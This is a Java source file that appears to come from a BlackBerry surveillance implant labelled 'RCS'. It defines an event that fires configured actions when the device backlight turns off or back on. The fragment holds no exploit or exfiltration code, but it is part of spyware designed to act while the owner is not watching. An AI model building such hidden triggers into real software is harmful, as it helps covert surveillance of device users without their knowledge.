//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : ScreenSaverEvent
 * Created      : 26-mag-2010
 * *************************************************/

package blackberry.event;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.BacklightObserver;

public class ScreenSaverEvent extends Event implements BacklightObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ScreenSaverEvent",
            DebugLevel.VERBOSE);
    //#endif

    int actionOnEnter;
    int actionOnExit;

    public ScreenSaverEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_SCREENSAVER, actionId, confParams, "ScreenSaverEvent");
        setPeriod(NEVER);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    protected final void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart: ScreenSaverEvent");
        //#endif
        AppListener.getInstance().addBacklightObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    protected final void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop: ScreenSaverEvent");
        //#endif
        AppListener.getInstance().removeBacklightObserver(this);
    }

    protected final boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            actionOnEnter = actionId;
            actionOnExit = databuffer.readInt();
        } catch (final EOFException e) {
            return false;
        }
        return true;
    }

    protected void actualRun() {

    }

    public final void onBacklightChange(final boolean enabled) {
        //#ifdef DEBUG
        debug.trace("onBacklightChange: " + enabled);
        //#endif
        if (!enabled) {
            trigger(actionOnEnter);
        } else {
            trigger(actionOnExit);
        }

    }

}
